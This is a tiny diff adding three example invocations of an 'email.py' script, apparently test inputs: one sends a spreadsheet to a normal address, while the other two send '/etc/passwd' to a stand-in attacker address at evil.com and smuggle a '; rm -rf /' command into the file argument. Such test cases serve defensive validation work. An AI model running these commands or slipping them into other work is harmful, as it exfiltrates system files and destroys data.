@@ -1,0 +1,3 @@
+python email.py alice@domain.se ./reportJanuary.xls
+python email.py devil@evil.com  '/etc/passwd'
+python email.py devil@evil.com  '/etc/passwd ; rm -rf / '
